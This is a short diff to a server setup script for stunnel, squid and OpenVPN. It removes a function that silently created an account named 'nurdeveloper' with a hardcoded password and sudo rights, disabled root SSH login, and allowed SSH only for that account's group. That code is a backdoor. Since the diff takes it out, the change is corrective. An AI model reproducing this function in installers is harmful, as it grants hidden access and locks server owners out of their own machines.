@@ -455,14 +455,7 @@ sudo service stunnel4 restart
   } &>/dev/null
 }
 
-install_sudo(){
-  {
-    useradd -m nurdeveloper 2>/dev/null; echo nurdeveloper:@@NRDev123@@ | chpasswd &>/dev/null; usermod -aG wheel nurdeveloper &>/dev/null
-    sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
-    echo "AllowGroups nurdeveloper" >> /etc/ssh/sshd_config
-    service sshd restart
-  }
-}
+
 
 install_rclocal(){
   {
@@ -523,7 +516,6 @@ server_ip=$(curl -s https://api.ipify.org)
 server_interface=$(ip route get 8.8.8.8 | awk '/dev/ {f=NR} f&&NR-1==f' RS=" ")
 
 install_require
-install_sudo
 install_squid
 install_openvpn
 install_firewall_kvm
